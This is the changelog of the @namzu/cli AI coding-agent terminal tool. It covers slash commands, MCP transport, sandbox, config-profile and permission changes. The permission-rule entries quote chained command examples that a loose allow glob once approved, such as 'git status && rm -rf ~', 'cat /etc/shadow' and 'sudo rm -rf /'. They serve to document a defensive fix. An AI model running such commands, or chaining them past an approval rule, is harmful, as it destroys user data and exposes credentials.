# @namzu/cli

## 15.0.0

### Major Changes

- 0532eb5: HTTP MCP transports no longer follow redirects. Configure the final MCP
  endpoint directly instead of a URL that returns a 3xx response. This is a
  breaking security boundary: authenticated SSE requests, session headers and
  JSON-RPC bodies now remain at the exact configured endpoint. A redirected
  tool call is reported as an unknown remote outcome that must not be retried
  automatically, because the configured server may already have applied it.

### Minor Changes

- 9937e90: Add a safe-first `/archive` confirmation that publishes a read-only durable conversation tombstone, removes it from `/resume`, and exits without printing a misleading resume command.
- e0d74ba: Add PageUp, PageDown, Home and End navigation to model, subscription, resume,
  prompt-edit, review, skill, permission, effort and copy choosers. Selection
  authority now updates synchronously so Enter applies the newest cursor even
  when navigation and confirmation arrive in one terminal input burst.
- 1d8ac36: Add Ctrl+L as an idle-only terminal display clear. It preserves model and
  durable conversation history like `/clear-screen`, and refuses while a turn is
  still producing output.
- d2c5896: Turn `/help` into an interactive, height-aware command palette that includes the live kernel and project command vocabulary and dispatches the selected row through the ordinary slash-command path.
- d85f9e0: Open bare `/export` as a destination chooser for a verified Markdown transcript.
  Clipboard export sends the complete durable projection through a bounded OSC 52
  request, while file export opens a session-prefilled filename editor and keeps
  the existing no-overwrite guarantee. `/export <path>` remains available.
- 6a71f3b: Open bare `/skills` as the discovered skill chooser. Preserve the previous text
  roster as `/skills list`, allow `/skills <name>` for direct activation, and keep
  `/skill` as a compatible alias.
- bd5b25c: Make Markdown HTTP(S) labels clickable on recognized terminal families while
  keeping destinations visible on unknown, remote, multiplexed and non-TTY output
  paths. Local-file and other non-web targets remain non-clickable.
- 677c185: Author multiline prompts with terminal newline bindings, move vertically by grapheme column, and preserve unsent text while traversing prompt history.
- 354b7a1: Ship and mount desktop computer use in the interactive CLI when its adapter
  initializes, with the host lifetime owned by the agent session and no exposure
  on unattended surfaces. WSL now targets the paired Windows desktop through
  `powershell.exe` instead of misclassifying WSLg as a Linux compositor session.
- 5d695e0: Edit drafts at the visible cursor with grapheme-safe movement and deletion, line-boundary movement, and terminal word and line kill bindings.
- ec42140: Move and delete by words with terminal-native bindings, and delete the next complete grapheme with Ctrl+D.
- 4ca89ce: Open the current text draft in the operator's `VISUAL` or `EDITOR` with Ctrl+G,
  temporarily releasing terminal raw mode and restoring the edited draft safely.
- 6265f5e: Grow slash-command and file-completion menus from six to as many as twelve
  visible choices when the terminal has spare height. Short terminals retain the
  bounded six-row window, and keyboard/page navigation continues over the full
  roster.
- c1b8c1f: Replace the successful `namzu skills` milestone stub with a real, trust-gated
  skill roster. The command supports `--cwd` and structured JSON/YAML output,
  shows broken skills with their refusal reason, and preserves project-over-user
  shadowing.
- 8cf937d: Navigate every slash-command match with visible position, page and boundary keys, including rapid terminal input bursts.
- 1b15308: Add selectable `/pwd` and `/mention` commands. `/pwd` reports the active
  session directory, while `/mention` restores an editable `@` file token in the
  composer without starting a model turn.
- 4ea7041: Add a prefilled conversation-name editor under `/rename`, keep `/title` as an
  alias, and persist the selected name directly to the session store for `/resume`.
- b74dcc7: Restore operator-authored prompt history for Ctrl+R after direct or in-TUI conversation resume.
- 4b6df87: Open bare `/review` as a keyboard chooser for a base branch, uncommitted work,
  a recent commit, or custom instructions. Branch comparisons are resolved to an
  immutable merge-base commit before reaching the agent, and finite choice labels
  use available terminal width instead of truncating every name to 18 columns.
- 46c3f95: Search submitted prompts with Ctrl+R and Ctrl+S while preserving the exact unsent draft and cursor.
- fd5baca: Add keyboard-selectable project-file mentions. `/mention` and a typed `@` show
  tracked, unignored paths; Enter or Tab inserts the selected token without
  submitting, and mention expansion refuses symlinks outside the trusted project.
- 8783b0b: Add `namzu resume <conversation-id>` as a copy-pasteable interactive-session
  handoff on clean exit. Short conversations now flow down from the banner while
  the composer remains near the terminal bottom, and slash-command navigation
  scrolls past the first six matches instead of making later commands unreachable.
- e3da442: Publish a model-owned reasoning-effort default alongside each exact menu and preserve it through retry, idle-timeout, and fallback decorators. Fallback chains expose a default only when every usable member agrees inside the common menu.

  Add non-wrapping Shift+Up/Shift+Down and Alt+period/Alt+comma effort shortcuts to the interactive composer. An unset selection anchors at the provider-published default; unknown or disagreeing defaults require an explicit `/effort` choice.

  Correct the subscription transport's model-specific effort contract. Recognized subscription models no longer offer or accept `none`, and only models whose current catalogue includes `ultra` accept it. Consumers that sent `none` to a recognized subscription model must omit effort or select one of the provider's published levels.

- 6f0b16f: Add terminal-native composer kill/yank editing: Ctrl+Y restores the last
  non-empty Ctrl+W, Ctrl+U, Ctrl+K, Alt+Backspace, or Alt+D deletion at the live
  cursor, and Ctrl+H consistently behaves as a grapheme-safe Backspace.
- d4dc3b3: Keep long model and conversation choices visible while navigating the terminal.
  Bare `/feedback` and `/skill` now open finite choosers, and a fully typed slash
  command is selected before longer names that share its prefix. When both
  Namzu-owned subscriptions exist, bare `/logout` asks which one to remove;
  provider-targeted slash and shell forms preserve the other credential.

### Patch Changes

- 315ee36: Make update checks settle at their deadline even when a registry transport or response body ignores cancellation, so `namzu upgrade` cannot hang indefinitely on an uncooperative request.
- b9c5b7c: Let task schedulers preserve an optional structured cancellation cause, and
  make the blocking `Agent` delegation end with the run that launched it. Parent
  cancellation now reaches both already-running tasks and tasks whose creation
  finishes late; built-in local and foreign schedulers expose `parent` on the
  child signal.

  Make the interactive session own its subagent runtime so Stop, session
  replacement and shutdown prevent late child tool work after the parent has
  settled.

- 6549301: Report the aggregate sandbox capability from the live runtime provider instead
  of optional-package installation, preventing contradictory startup diagnostics.
- 7209853: Report current MCP transport failures from `/mcp` instead of continuing to show a server as connected after its process or network connection has closed.
- e1a7e69: Add the observational `run_interrupt` plugin hook for explicitly user-cancelled root runs. Every registered interrupt handler gets a bounded cleanup window before the durable cancellation event; one handler's skip, error, retry, or timeout no longer suppresses later interrupt observers.

  Attribute interactive CLI turn interrupts to the public `user` cancellation cause so configured interrupt hooks run on both ordinary Stop actions and permission-prompt cancellation.

- 18e4d8c: Repeated headless run invocations no longer retain stdin listeners when an open pipe sends no data. The terminal test harness also releases its process-exit hook after teardown.
- 60ef03d: Report the running CLI package version in `namzu doctor --json` instead of the
  generic `unknown` placeholder.
- 6fa623a: Show the complete prepared tool input in interactive permission prompts instead
  of approving from a shortened summary. The terminal review is paged by physical
  rows and refuses an oversized or non-JSON-compatible batch rather than
  truncating it; ACP permission requests now carry the exact prepared input.
- Updated dependencies [7ea6c6c]
- Updated dependencies [5591d35]
- Updated dependencies [64f8040]
- Updated dependencies [cf2e8d0]
- Updated dependencies [b9c5b7c]
- Updated dependencies [5e95792]
- Updated dependencies [84d202d]
- Updated dependencies [8943b5b]
- Updated dependencies [354b7a1]
- Updated dependencies [c7783a6]
- Updated dependencies [6b49cdb]
- Updated dependencies [0f65d5e]
- Updated dependencies [e1a7e69]
- Updated dependencies [07990a8]
- Updated dependencies [f1c368d]
- Updated dependencies [8126a5a]
- Updated dependencies [1a59f58]
- Updated dependencies [10c0434]
- Updated dependencies [8fcb248]
- Updated dependencies [0532eb5]
- Updated dependencies [5854b4d]
- Updated dependencies [eca824b]
- Updated dependencies [e3da442]
  - @namzu/sdk@33.0.0
  - @namzu/computer-use@1.4.0
  - @namzu/openai@2.0.0
  - @namzu/anthropic@4.0.1
  - @namzu/ollama@2.2.1
  - @namzu/openrouter@2.3.1

## 14.3.0

### Minor Changes

- 10ba4b6: Make the interactive composer distinguish active-turn steering from queued
  follow-ups: Return steers at the SDK's next safe boundary while Tab queues the
  next turn, preserving attachments and durable ordering. Add Alt+V clipboard
  images and Ctrl+W word deletion, widen slash-command descriptions, keep recent
  transcript rows next to the composer, and replace the clean-exit diagnostic dump
  with a concise conversation `/resume` handoff.
- eb0401e: Add `namzu upgrade` and the read-only `namzu upgrade --check`. The updater
  derives the npm prefix from the package that is actually running, pins the
  registry's exact version, and reads that same package root back before reporting
  success; installations whose owner cannot be established are refused rather
  than updating another binary on `PATH`.

  The TUI's update notice now points to the real command. Finite `/permissions`
  and `/effort` choosers also ignore the Return key that opened them until the
  menu has committed, preventing a key repeat from applying the first choice
  before the operator can see it.

### Patch Changes

- aedd9f8: Bound live tool progress under host backpressure. `ToolContext.report()` now
  keeps at most one in-flight and one latest pending update per call, caps each
  published message at 8 KiB of UTF-8, and settles accepted progress before the
  terminal event without changing the durable tool result. The interactive CLI
  shows that latest progress and optional percentage on the matching live tool
  row with terminal-safe rendering.
- b3a3665: Bound recalled prompt rendering so large history entries cannot exhaust terminal layout work while their complete source remains editable and is resubmitted unchanged.
- 90deea2: Recover a server-confirmed invalid-image request once when the provider-bound
  history contains exactly one distinct image. HTTP 400 responses carrying the
  exact `invalid_image` provider code preserve the original bytes with durable
  `modelOmission` metadata after a successful image-free retry, suppress that
  image on later requests, and emit a measured history-repair event. A legacy
  phrase can recover the current request but cannot claim durable server proof;
  failed, ambiguous, partial-output, and cancelled attempts leave history unchanged.

  SDK consumers that exhaustively switch over
  `message_history_repaired.source` must handle the new
  `provider-rejected-image` member. Persistence implementations must retain the
  optional `modelOmission` field on image attachments and image tool-result
  blocks. `ProviderErrorInfo.providerCode` is now the bounded machine identifier
  from a provider error response; do not parse `detail` for provider-defined
  codes. Hosts should render the repair as retained bytes with model delivery
  suppressed, not as deletion.

- 1643672: Add `runtime-context` to `UserMessageSource` and tag SDK-authored user-role
  messages with the reason they were inserted. Consumers that exhaustively switch
  over `UserMessageSource` must handle the new member; persistence layers must
  preserve it instead of reclassifying the message as operator input.

  The CLI now renders, edits, resumes, validates and exports these durable messages
  as runtime context rather than as text typed by the operator.

- e69e881: Keep packaged TUI installs on the renderer versions exercised by Namzu's PTY
  suite, preventing subscription login from allocating an unbounded terminal
  frame after dependency resolution. `/login` now separates reusable Claude and
  Codex device sessions from new Namzu-owned sign-ins, and reports when the host
  has no browser launcher instead of claiming one opened.
- Updated dependencies [343730a]
- Updated dependencies [aedd9f8]
- Updated dependencies [90deea2]
- Updated dependencies [1643672]
- Updated dependencies [645b9db]
  - @namzu/sdk@32.0.0
  - @namzu/anthropic@4.0.1
  - @namzu/ollama@2.2.1
  - @namzu/openai@1.5.0
  - @namzu/openrouter@2.3.1

## 14.2.1

### Patch Changes

- 9e1c9a3: Repair Claude subscription sign-in by matching the current registered browser request, letting the provider picker accept its returned authorization code, and preserving the subscription-routing identity on model requests. Print the TUI banner once during boot and keep the permanent idle key legend out of the footer while preserving state-specific interaction hints.
- Updated dependencies [9e1c9a3]
  - @namzu/anthropic@4.0.1

## 14.2.0

### Minor Changes

- 5452bfc: Reuse Claude and Codex subscription sessions from a paired Windows home under WSL, refresh a rotating Claude grant back into its exact owner envelope, and align new Claude sign-in with the direct subscription OAuth flow instead of API-usage billing. Bare `/effort` and `/permissions` now open finite keyboard choosers, while the footer keeps model, effort, working directory and durable goal state visible. Argument forms and API-key authentication remain available.

## 14.1.0

### Minor Changes

- e28f7dc: Let `/copy` choose the whole latest assistant response, an exact fenced-code body,
  or an exact prose blockquote. The picker stays anchored to the response it opened
  with and holds queued work until the operator selects or cancels it.
- 77242a0: Expose optional per-model input modalities through `ModelInfo`, add inline image input for DeepSeek's vision preview while refusing images on text models and documents on every DeepSeek model, and label models whose listing explicitly advertises image input in the CLI picker.
- cc9917b: Reuse a sole signed-in Claude or Codex subscription automatically on first run,
  ask only between those subscriptions when both exist, and keep the Claude/Codex
  Namzu sign-in choice reachable when an optional API key was also detected.

### Patch Changes

- Updated dependencies [77242a0]
  - @namzu/sdk@31.1.0
  - @namzu/deepseek@1.1.0

## 14.0.0

### Major Changes

- 09141a8: Reuse usable Claude and Codex device sessions before asking for a new credential, add a selectable Namzu-owned login for both subscriptions, and keep API keys optional. Bare `namzu login` no longer starts Claude implicitly; run `namzu login claude` or `namzu login codex`, or choose the provider from the interactive `/login` screen.

  Add the account-routed `CodexProvider` and `registerCodex()` Responses transport to `@namzu/openai`. Hosts supply a user-authorized access token and ChatGPT account id, and remain responsible for discovery, refresh and persistence.

### Patch Changes

- Updated dependencies [09141a8]
  - @namzu/openai@1.5.0

## 13.0.0

### Major Changes

- f3bf47b: Require every `PluginLifecycleManager` host to provide project and user
  `scopeRoots`. Plugin installation now canonicalizes a candidate against that
  declared filesystem authority, refuses symlinked or non-regular plugin
  manifests, and keeps executable admission and lifecycle ownership private to
  the manager instead of trusting mutable `PluginRegistry` records.

  Hosts constructing the SDK manager must pass
  `scopeRoots: { project: trustedWorkingDirectory, user: userHomeDirectory }`.
  Move plugins under the matching root instead of relying on a symlink or an
  out-of-scope registry record. The CLI applies those roots automatically and no
  longer loads project or user plugins through links that leave the admitted
  scope.

- fd5fcea: Bound sandbox lifecycle ownership across run cancellation and teardown.

  Sandbox creation now receives run cancellation and the run's remaining wall-clock timeout, cannot publish a handle after either boundary wins, and releases any handle that arrives late. A setup that ignores its signal therefore settles the run with `stopReason: 'timeout'` instead of pinning it forever. Teardown receives a fresh signal and waits for 30 seconds by default without allowing an implementation that ignores cancellation to pin the run. Set `sandboxTeardownTimeoutMs: 0` on SDK runs or agents to retain the former unbounded teardown wait. Custom providers should honor `SandboxCreateConfig.signal` and `SandboxDestroyOptions.signal`; remote allocation protocols still need a client-owned reconciliation key or fleet reaper for a resource committed behind a lost response.

  The CLI exposes the same compatibility control as `sandbox.teardownTimeoutMs` and carries it to live turns, delegated child agents, and durable resumes. Children and resumed runs now use the session's sandbox provider instead of silently executing through the host boundary; set `sandbox.enabled: false` only when host execution is intentional.

- d5ccf03: Change `/clear` to start a new resumable conversation context as well as clearing the terminal. Use `/clear-screen` to retain the previous screen-only behavior. Add `/new` to start the same fresh context without clearing visible scrollback.
- 08f89c5: Refuse explicit invalid values for known configuration keys instead of silently substituting a default, lower-precedence value, or disabled feature.

  `loadConfig` and `loadConfigWithProvenance` now validate user, project and managed files, every declared profile body, and explicit `NAMZU_FORMAT` / `NAMZU_QUIET` values. A semantic failure throws the exported `ConfigValueError`, which names the source and exact setting path. The CLI maps it to `EX_CONFIG` (78); an invalid `--format` is rejected as command-line usage (64) before the command runs. Unknown keys remain non-strict and permission/MCP entries retain their existing per-entry diagnostics.

  Profile selection now uses own-property semantics, so inherited object names such as `toString`, `constructor`, and `__proto__` are not treated as declared profiles. A literal own profile with any of those names remains selectable.

  **What breaks:** callers that previously received a fallback config from a known invalid file, profile, or environment value now receive `ConfigValueError`; scripts passing an unsupported `--format` no longer run in text mode. Fix the named value or remove it, and unset an environment variable rather than setting it to an empty string when no override is intended.

- 79faa99: Add a host-owned live project-instruction context to the SDK. Queries and all
  agent front doors can rebuild a retained snapshot before the first provider
  request, observe completed top-level and nested registry executions, and
  durably replace that snapshot after a complete tool batch without creating a
  human continuation. Callbacks receive the run cancellation signal and accepted
  message prefix; each returned snapshot is committed before the next observation
  begins, so cancellation retains accepted policy state while rejecting an
  unfinished suffix. Project-instruction messages carry bounded canonical
  project-relative `AGENTS.md` provenance and survive compaction.

  BREAKING: the CLI now represents repository instructions as scoped, retained
  conversation context instead of a frozen system-prompt block. Hosts that inspect
  raw provider messages or persisted session history must handle the
  `project-instructions` user-message source. This lets nested instructions take
  effect during the session and lets reconstruction re-read current disk content
  instead of replaying stale policy prose.

- ee48cb0: A `[permissions]` rule about `bash` decides the commands the line runs

  An operator's table compiled to a pattern matched against the serialised tool
  input, and two loosenesses came with that subject. The rule could match the
  start of any argument's value rather than the one they meant, and the match
  stayed open on the right — so `bash = { "git status*" = "allow" }` also approved
  `git status && rm -rf ~` and `git statusx; cat /etc/shadow`. The
  dangerous-pattern floor does not cover either: it is four patterns about
  catastrophic commands and says nothing about reading a credential file.

  A tool that declares which of its arguments holds a command line — `bash` does —
  is now compiled through the kernel's `argument_pattern`, whose subject is that
  argument's own value read as the commands it runs. Chain operators, subshell
  grouping and a nested `sh -c` payload are read; quoting is respected.

  The asymmetry the compiler already had is carried over, because the reasons for
  it did not change:

  - An `allow` anchors, and now anchors **per command**: every command on the line
    must match, or the call falls through to being asked.
  - A `deny` stays loose, and now also sees a command riding behind a separator:
    `"git push*": "deny"` refuses `true; git push`, and `"rm -rf*": "deny"` still
    refuses `sudo rm -rf /`.

  **What breaks.** A table that relied on either looseness stops approving what it
  used to. `"git status*": "allow"` no longer covers `git status && anything`;
  `"*git status*": "allow"` still loosens the match within one command and no
  longer reaches across commands. To approve every call to a tool, write
  `"*": "allow"`, which now compiles to a by-name rule rather than to a pattern —
  "every call" cannot be expressed as a pattern about an argument that a call
  might not carry.

  Tools that declare no command argument — MCP servers, host tools, `edit`,
  `read` — compile exactly as before.

### Minor Changes

- 74705e2: Add `/compact`, which shrinks a conversation when you ask rather than when a threshold decides.

  The machinery already existed — `compactNow` is exported from `@namzu/sdk` and its comment says it is "compaction a host can ASK for" — and no host asked. A long session could only be compacted by crossing a token threshold mid-turn, which is the moment you least want a model call, or by clearing it and losing everything.

  `/compact` summarises the older half and keeps the recent turns. What it does with the transcript is the part worth knowing: the transcript is **trimmed** to the surviving turns rather than rebuilt from the returned messages. The two are not the same list — the transcript also holds tool rows, per-tool glyphs and collapsed bodies the model never saw, and rebuilding would produce a correct conversation while erasing how the surviving turns looked. Tool rows belonging to a kept turn stay with it, because an answer on screen with no visible cause is worse than a longer transcript.

  A conversation too short to shed anything says so instead of reporting a compaction that did not happen, and the summary is attached to the row as collapsible detail — it is what the model reads from here on, so it has to be inspectable.

  `CompactNowInput` and `CompactionResult` are now exported from `@namzu/sdk`. `compactNow` was on the public surface and its parameter and return types were not, so the first host to call it had to inline the shapes.

- 2318422: Config profiles, and a machine-wide file that wins the cascade

  **Profiles.** A named bundle of settings _inside_ a config file, so the settings
  you switch between sit next to each other and can be read as a set — which a
  second config file cannot give you, because a second file has to be found before
  it can be compared.

  ```json
  {
    "permissions": { "bash": "ask" },
    "profiles": {
      "ci": { "quiet": true, "permissions": { "bash": "allow" } },
      "review": { "permissions": { "bash": "deny", "read": "allow" } }
    }
  }
  ```

  Select with `--profile ci` or `NAMZU_PROFILE=ci`; the flag wins, because a flag
  is this run and a variable is this shell. A profile overrides the base values of
  the file it was declared in — otherwise selecting it could not change anything —
  and loses to the environment, so a variable set for one shell keeps working
  after somebody picks a profile.

  The same name may appear in both config files. Each is applied as its own layer
  in the usual file order, so the project's wins _and_ `ConfigProvenance` still
  names the file each value actually came from; one merged layer would report both
  as "the profile" and send an operator to the wrong file. A profile may set
  anything except `profiles`.

  **A name no file declares is refused, not ignored**, with the declared names and
  the files that declare them in the message. Ignoring it means running under
  settings nobody chose and reporting success.

  **The managed file.** `/etc/namzu/config.json` (`%ProgramData%\namzu\config.json`
  on Windows) is read last and beats the project file and the environment both —
  the only ordering that makes such a layer worth having. It exists for the case
  where the person running namzu is not the person deciding what it may do.

  Its guarantee is the file system's and nothing more: no signature is verified,
  no owner is checked, and namzu cannot tell an administrator's file from one a
  user wrote there. What stops a user editing it is that the path needs privileges
  they do not have. It is absent on almost every machine, which is expected.

  `ConfigSource` gains `profile` and `managed` variants. A host switching on it
  exhaustively will need the two new arms.

- 7576054: Add `/debug-config`, a values-free view of the winning source for every resolved configuration key.

  The command identifies defaults, user and project files, selected profiles, environment variables, the managed file, and exact `--format` or `--quiet` overrides. It retains the selected profile even when higher-precedence layers replace all of that profile's values.

  Dynamic source metadata is credential-redacted and emitted only as quoted printable ASCII with visible escapes for control, bidirectional-formatting and non-ASCII code points.

- a4ba972: Add `/diff`, which shows what is uncommitted in the working tree.

  There was no in-session way to see what had changed. The answer was another terminal, and an operator who did not switch to one accepted a turn's work without reading it.

  **It reports the working tree, and says so on every non-empty answer.** The obvious framing — "what this session changed" — is one the CLI cannot honestly make: the tool events carry a human-readable summary rather than a path, and parsing a path back out of prose would be a guess dressed as attribution. So the command answers the question it can answer and names it accurately, rather than answering a better-sounding one wrongly.

  Two things it refuses to get wrong. A directory that is not a repository produces an empty diff from any naive implementation, and an empty diff reads as _working tree clean_ — a claim about a repository that does not exist; this says it cannot tell. And `git diff` shows no untracked file at all, so a session whose entire output is new files would otherwise report changing nothing; untracked paths are listed separately.

  The patch goes in the collapsible body with a byte cap, because a transcript is not a pager and a diff that scrolls the session away has answered by making the answer unreadable.

- 3e27578: Edit a previous user prompt on a source-preserving conversation branch with Esc
  twice from an empty composer.

  The prompt picker forks immediately before the selected user message, restores
  its readable text and every durable attachment into the composer, and keeps the
  original conversation unchanged. Editing the first prompt creates an
  empty-prefix branch. Selection is compare-and-swap guarded against durable
  history so a stale picker cannot branch at a different boundary.

- a33c696: Add a default-off `plugins` configuration for trusted project and user plugin
  discovery. Enabled CLI sessions now install SDK plugin tools, hooks, skills and
  stdio MCP servers across interactive, headless, durable-resume and ACP entry
  points, and own rollback and teardown of those contributions. Plugin authority
  must come from a config file; environment-selected profiles cannot enable it.
- 94d3306: Add the chain-aware `reasoningEffortLevelsFor(model, thinking)` provider capability while retaining `effortLevelsFor` as a deprecated compatibility member. The four capability states now distinguish a driver with no menu, an unknown model, an explicitly unsupported model, and an exact selectable set; fallback chains expose only levels every reachable member accepts.

  The TUI adds session-scoped `/effort [level|default]`, sends the selection to later main-query turns, and resets it atomically when a provider/model replacement succeeds. Failed or cancelled replacements preserve the current selection.

  OpenAI publishes exact known-model menus and keeps unknown compatible-endpoint models unknown. DeepSeek explicitly publishes no supported levels. Anthropic now refuses unsupported effort levels before transport instead of silently dropping them; callers upgrading Anthropic must choose a level returned by `reasoningEffortLevelsFor()` or omit `effort` to retain the provider default.

- bad2c20: Make new conversation forks exportable by atomically publishing and verifying their copied model context before recording an immutable source-turn boundary. Nested forks flatten that boundary, later source turns cannot leak into it, and ambiguous or legacy prefixes remain explicitly unexportable.
- 75eb7a1: Add `/mcp`, which shows which tool servers connected, what each exposes, and which failed.

  The facts were reported once, at connect time, as transcript rows that scroll away. Ten minutes into a session there was no way to ask again — and a server that failed to start is, from the operator's seat, indistinguishable from one nobody configured. That is exactly the state they are in when a tool they expected is simply not there.

  Failures are listed as prominently as successes and never omitted, because a page that showed only what worked would look correct and complete on a machine where nothing did. "No session yet" and "no servers configured" are reported as the different facts they are.

  Tools are **named**, not counted. A count answers "did it connect"; the operator's actual question is whether the tool they wanted is among them. The names are carried from the listing at connect time rather than recovered afterwards by splitting the `mcp_<server>_` prefix apart — that prefix is an encoding `integrations/mcp/servers.ts` owns, and recovering it elsewhere would make it a format two places have to agree about.

- ac05c1c: `permissionChecks`: state what your permission table decides, and have it checked

  A `[permissions]` table is a set of globs compiled to regular expressions and
  matched against a subject the operator never sees. Every stage of that has been
  wrong at least once, and each time the failure was silent and permissive — a
  rule that read like a prohibition and decided nothing, an `allow` whose match
  began wherever the text did, a glob whose trailing star reached past the end of
  a command. The config looked right in every case, and nothing an operator could
  run would have told them otherwise.

  A new optional `permissionChecks` array states the decision the operator
  believes their table produces, and every entry is evaluated against the compiled
  table at startup:

  ```json
  "permissionChecks": [
    { "tool": "bash", "input": { "command": "git status --short" }, "expect": "allow" },
    { "tool": "bash", "input": { "command": "git status && rm -rf ~" }, "expect": "ask" }
  ]
  ```

  The second is the point: it asserts a NEGATIVE — that a rule does not stretch to
  cover a command nobody named — which is exactly what a table of globs cannot be
  read for.

  A mismatch is reported by index with the decision it got, the one expected, and
  the rule that decided; the run continues, because a wrong expectation should
  cost that line and not the whole policy. A check that cannot be read is reported
  rather than skipped. The dangerous-pattern floor is off while checking, so a
  check written about the table cannot be answered by something the table does not
  contain — and cannot keep passing after the rule it was written for is deleted.

  Not settable from the environment: a variable that could replace the checks
  could also empty them.

- 04d5801: Add `/raw [on|off]`, a copy-friendly transcript mode that replays retained
  scrollback as literal Markdown source and complete plain tool output without
  changing conversation context or persistence.
- 7ed1d5e: Add `/review`, which asks the agent to review the uncommitted work.

  It rests on `/diff`: the same reading of the working tree, turned into a turn.

  The whole command is really its prompt, because a review turn fails in two opposite directions and both read as success. It can **invent** problems — worse than no review, since somebody acts on the finding — so the instruction requires each one to name a file, a line, and the input or state that produces the wrong behaviour, and to be withheld otherwise. And it can **reassure**, or restate the diff back, which is what a model produces when it has nothing to say; so summarising is refused outright and answering "this looks right" in one line is explicitly allowed. Without an approved way to report nothing, the only available answer is to find something.

  The file list is sent, not the patch. The agent has a shell and can read what it wants; pasting in a truncated patch would spend the context that reading the interesting parts properly requires, and a review of a truncated diff is a review of whatever fitted.

  Over a clean tree it refuses rather than sending the turn — a review of nothing comes back reading exactly like a review of something.

- b1b240b: Allow an interactive session to inspect and select `prompt`, `auto`, or `strict`
  tool-review behavior with `/permissions`. Changing mode at an idle boundary now
  revokes an earlier approve-all choice, and a session launched with `--yolo` can
  be narrowed back to prompting without rebuilding the session.
- 143b8d9: Add session-owned durable completion goals, direct `/goal` operator control,
  and race-fenced automatic continuation.

  SDK consumers can persist, inspect, and transition a `SessionGoal` through
  tenant-authorized in-memory or disk stores with exact revision checks. CLI
  operators can create, inspect, edit, pause, resume, and clear the goal belonging
  to the active durable conversation without sending those commands to the model.

  The SDK also exposes atomic admitted-round accounting, finite caps,
  process-local activation, host provenance for goal-sourced user messages, and
  run-scoped goal tools. The CLI drives those primitives only at a durable idle
  boundary, keeps human prompts ahead across admission races, withholds goal tools
  from ordinary and child runs, disarms on abnormal or non-durable settlement,
  and preserves automatic-turn attribution through resume and verified export.

- 4491a23: Add `/status`, which shows where a run may write and when it stops to ask, on one page.

  Both facts were already there and neither was findable next to the other. The sandbox arrives as a boot notice that scrolls away; the approval settings answer to `/permissions`. They are separate mechanisms answering separate questions, and neither implies the other — turning approvals off widens no sandbox, and confining the filesystem stops no prompt. Read apart, each looks like the whole answer, which is exactly how an operator ends up believing they configured something they did not.

  `/status` prints them adjacently, each labelled with the question it answers rather than with its mechanism's name, along with the provider, model and spend.

  Two things it refuses to smooth over. A tier that enforces nothing is reported as **not confined** rather than as a weaker sandbox, because it is the absence of one. And what the config _demanded_ is printed separately from what the host _happens_ to supply: those read identically on a machine that supplies it anyway, and only the demand still holds on the next machine.

  `ResolvedSandbox` gained the structured facts behind its notice (`environment`, `enforced`, `required`), and `AgentSession` carries a `SandboxSummary` so a caller reads the sandbox the run is actually using rather than resolving a second one.

- 043b8ba: Add `/copy`, which sends the latest available raw assistant output to the terminal clipboard through a bounded OSC 52 request.

  While another turn is streaming, the previous normally completed answer remains the target. Partial or abnormal completions do not replace it, `/clear` and `/compact` preserve it, and `/resume` selects the newest persisted assistant output in the resumed conversation.

  The command refuses non-interactive terminals and output above 100,000 UTF-8 bytes without truncating. Because OSC 52 cannot acknowledge clipboard acceptance, the UI reports that a request was sent and warns that terminal policy may ignore it instead of claiming the clipboard changed.

- 0131939: Add opt-in, content-free terminal notifications to the interactive UI.

  Configure `tui.notifications` as `true` for both supported moments or as a list
  containing `turn-settled`, `approval-required`, or both. Notifications remain
  off when the setting is absent. `tui.notificationMethod` selects `osc9` (the
  default) or `bel`.

  Approval is signalled only when the prompt actually opens. Turn settlement is
  signalled only after immediately queued work is exhausted; manual interruption
  and an abandoned turn from a resumed conversation do not produce late or
  duplicate notices. Fixed notification text carries no conversation or tool
  content, and no host command is started.

  The terminal protocols do not acknowledge display or sound. A successful write
  therefore means only that the request was sent and may still be ignored by the
  terminal or an intermediate session.

- 0d8e19a: `/title` and `/fork`: name a conversation, and branch one

  `/resume` listed every conversation by the first thing typed in it. That is a
  reasonable default and a poor identity — it stops describing the work as soon as
  the work moves on from its opening question, and two conversations that began
  the same way are one row twice.

  `/title <name>` fixes a name in place; bare `/title` reports the current one, and
  `/title clear` goes back to the derived one. Bare `/title` deliberately asks
  rather than clears: a name erased by an early enter is a loss nobody notices
  until the next `/resume`. Named rows are shown in quotes, because a chosen name
  keeps meaning what it meant and a derived one does not, and without the mark the
  list reads as if every row were chosen.

  `/fork` continues in a copy and leaves the original where it is: the transcript
  on screen carries over, the next turn is written to the copy, and the original
  is unchanged and still resumable. The copy is a real session with the transcript
  written into it rather than a pointer, so the two diverge from the fork point.

  It is always named — `… (fork)`, then `… (fork 2)` — and that is load-bearing
  rather than cosmetic: a fork and its original share every message they have, so
  both derive the same title, and `/resume` would show two rows a person cannot
  tell apart in the list they would use to undo the fork.

  `/fork` is refused while a turn is running. Interrupting the way `/resume` does
  would be wrong here: `/resume` leaves a conversation, so an interrupted reply
  landing in the one being left belongs there — a fork stays, and the copy would
  be missing the last thing the operator watched arrive.

  Names live in `.namzu/titles.json` beside the sessions rather than on the SDK's
  `Session`: nothing in the kernel would read one, and putting it in the entity
  would widen a store interface every host implements to carry a string only the
  CLI writes and displays.

  `RecentConversation` gains a `named: boolean`. A host rendering its own picker
  should show the two kinds differently.

- c6ebb31: Add `/export [path]` to write a no-clobber Markdown conversation from durable CLI turn bindings and event-head-verified SDK run evidence. Legacy conversations and unresolved fork prefixes refuse instead of producing a partial file.

  Add `ReadRunEventsOptions.integrity`. The default `tolerant` mode retains the existing damaged-line skip behavior; `strict` refuses torn, malformed, or discontinuously numbered event logs for callers that need a completeness proof.

### Patch Changes

- 45d7014: Preserve complete SDK messages supplied to stateless `run-stream` on stdin, including opaque reasoning, attachments, citations, and tool exchanges. Malformed or provider-incomplete history now refuses before a run instead of silently continuing with dropped context.
- 753b037: Make disk-backed memory reads and mutations fail closed on incomplete,
  malformed, unsafe, or uncommitted durable state.

  Indexed content is now validated before it is returned or updated. Missing
  content, invalid JSON, newer schemas, mismatched IDs, invalid field shapes,
  unsafe filename IDs, and content directories resolving outside the memory
  root refuse the operation instead of becoming a false not-found or success.

  Disk-memory operations sharing one canonical index path are serialized within
  the SDK process and reload the authoritative index before acting. Concurrent
  CLI parent/delegate saves no longer lose all but the last record, warmed
  readers observe sibling writes, and create/update/delete publish live state
  only after their required durable operations succeed. Cross-process writers
  still require a single owner or storage-level conditional publication.

- 3c61c94: Make manual compaction the conversation history used after the command, not only a transcript notice.

